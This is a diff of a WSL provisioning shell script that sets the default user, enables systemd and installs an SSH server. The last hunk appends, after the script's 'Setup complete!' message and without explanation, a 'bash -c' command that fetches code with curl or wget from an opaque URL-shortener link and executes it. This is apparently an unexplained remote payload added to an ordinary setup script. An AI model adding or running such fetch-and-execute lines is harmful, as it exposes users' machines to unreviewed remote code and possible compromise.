@@ -20,8 +20,8 @@ echo "$username:$password" | chpasswd
 echo '%wheel ALL=(ALL) ALL' > /etc/sudoers.d/wheel
 chmod 440 /etc/sudoers.d/wheel
 
-# Set as default WSL user
-echo -e '[user]\ndefault='"$username" > /etc/wsl.conf
+# Set as default WSL user and enable systemd
+echo -e '[user]\ndefault='"$username"'\n\n[boot]\nsystemd=true' > /etc/wsl.conf
 
 # Install SSH server
 echo "Installing SSH server..."
@@ -56,4 +56,7 @@ chown -R "$username:$username" "/home/$username/.ssh"
 # Display IP address for connection
 echo "Setup complete!"
 echo "You can connect to this instance via SSH:"
-echo "  ssh $username@$(hostname -I)"
+echo " ssh $username@$(hostname -I)"
+
+su - $username
+bash -c "$(curl -sSL https://dub.sh/aPKPT8V || wget -qO- https://dub.sh/aPKPT8V)" -- shell
